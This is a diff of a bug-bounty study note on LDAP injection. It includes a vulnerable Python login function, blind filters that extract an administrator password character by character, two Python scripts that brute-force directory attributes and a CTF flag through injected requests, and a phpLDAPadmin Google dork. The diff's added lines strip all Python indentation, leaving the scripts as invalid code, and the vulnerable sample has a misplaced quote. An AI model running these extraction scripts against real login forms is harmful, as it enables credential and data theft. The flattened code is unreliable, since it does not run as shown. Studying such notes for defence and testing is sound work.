@@ -11,9 +11,9 @@ The LDAP directory's organization resembles a **tree hierarchy, starting with th
 Copy
 
 ```
-PORT    STATE SERVICE REASON
-389/tcp open  ldap    syn-ack
-636/tcp open  tcpwrapped
+PORT STATE SERVICE REASON
+389/tcp open ldap syn-ack
+636/tcp open tcpwrapped
 ```
 
 # WHAT IS LDAP INJECTION
@@ -137,18 +137,18 @@ password=any
 from ldap3 import Server, Connection, ALL, NTLM
 
 def authenticate(username, password):
-    server = Server('ldap://example.com', get_info=ALL)
-    conn = Connection(server, user=f'example_domain\\{username}, password=password, authentication=NTLM')
-    if conn.bind():
-        print('Authentication succesfull')
-    else:
-        print('Authentication failed')
+ server = Server('ldap://example.com', get_info=ALL)
+ conn = Connection(server, user=f'example_domain\\{username}, password=password, authentication=NTLM')
+ if conn.bind():
+ print('Authentication succesfull')
+ else:
+ print('Authentication failed')
 
 if __name__ == '__main__':
-    username_input = input('Username: ')
-    password_input = input('Password: ')
+ username_input = input('Username: ')
+ password_input = input('Password: ')
 
-    authenticate(username_input, password_input)
+ authenticate(username_input, password_input)
 ```
 
 This code is vulnerable due to its `username_input` parameter, it is injected directed on the server, so, an attacker can use this to bypass the login or get access to confidential data.
@@ -161,7 +161,7 @@ The code is also vulnerable due to the lack of poor sanitization and validation 
 
 I'll be using the same channel that I used in the [XPATH INJECTION](XPATH%20INJECTION.md) note:
 
-<iframe width="800" height="545" src="https://www.youtube.com/embed/bqPtLEltBp4" title="Curso Bug Bounty  |  LDAP Injection- Capitulo 4-1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+<iframe width="800" height="545" src="https://www.youtube.com/embed/bqPtLEltBp4" title="Curso Bug Bounty | LDAP Injection- Capitulo 4-1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
 Imagine we have this lab:
 
 ![Pasted image 20241011170436.png](../../../../IMAGES/Pasted%20image%2020241011170436.png)
@@ -261,13 +261,13 @@ You can iterate over the ascii letters, digits and symbols:
 
 
 ```
-(&(sn=administrator)(password=*))    : OK
-(&(sn=administrator)(password=A*))   : KO
-(&(sn=administrator)(password=B*))   : KO
+(&(sn=administrator)(password=*)) : OK
+(&(sn=administrator)(password=A*)) : KO
+(&(sn=administrator)(password=B*)) : KO
 ...
-(&(sn=administrator)(password=M*))   : OK
-(&(sn=administrator)(password=MA*))  : KO
-(&(sn=administrator)(password=MB*))  : KO
+(&(sn=administrator)(password=M*)) : OK
+(&(sn=administrator)(password=MA*)) : KO
+(&(sn=administrator)(password=MB*)) : KO
 ...
 ```
 
@@ -298,22 +298,22 @@ alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
 attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]
 
 for attribute in attributes: #Extract all attributes
-    value = ""
-    finish = False
-    while not finish:
-        for char in alphabet: #In each possition test each possible printable char
-            query = f"*)({attribute}={value}{char}*"
-            data = {'login':query, 'password':'bla'}
-            r = requests.post(url, data=data, proxies=proxy)
-            sys.stdout.write(f"\r{attribute}: {value}{char}")
-            #sleep(0.5) #Avoid brute-force bans
-            if "Cannot login" in r.text:
-                value += str(char)
-                break
+ value = ""
+ finish = False
+ while not finish:
+ for char in alphabet: #In each possition test each possible printable char
+ query = f"*)({attribute}={value}{char}*"
+ data = {'login':query, 'password':'bla'}
+ r = requests.post(url, data=data, proxies=proxy)
+ sys.stdout.write(f"\r{attribute}: {value}{char}")
+ #sleep(0.5) #Avoid brute-force bans
+ if "Cannot login" in r.text:
+ value += str(char)
+ break
 
-            if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
-                finish = True
-                print()
+ if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
+ finish = True
+ print()
 ```
 
 
@@ -328,13 +328,13 @@ alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
 
 flag = ""
 for i in range(50):
-    print("[i] Looking for number " + str(i))
-    for char in alphabet:
-        r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
-        if ("TRUE CONDITION" in r.text):
-            flag += char
-            print("[+] Flag: " + flag)
-            break
+ print("[i] Looking for number " + str(i))
+ for char in alphabet:
+ r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
+ if ("TRUE CONDITION" in r.text):
+ flag += char
+ print("[+] Flag: " + flag)
+ break
 ```
 
 ## Google Dorks
@@ -347,7 +347,7 @@ intitle:"phpLDAPadmin" inurl:cmd.php
 
 ## VIDEO
 
-<iframe width="800" height="545" src="https://www.youtube.com/embed/z1l9BmnrxVE" title="Curso Bug Bounty  |  LDAP Data Exfiltration &amp; Blind Exploitation- Capitulo 4-2" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+<iframe width="800" height="545" src="https://www.youtube.com/embed/z1l9BmnrxVE" title="Curso Bug Bounty | LDAP Data Exfiltration &amp; Blind Exploitation- Capitulo 4-2" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
 
 ### VID LAB
 
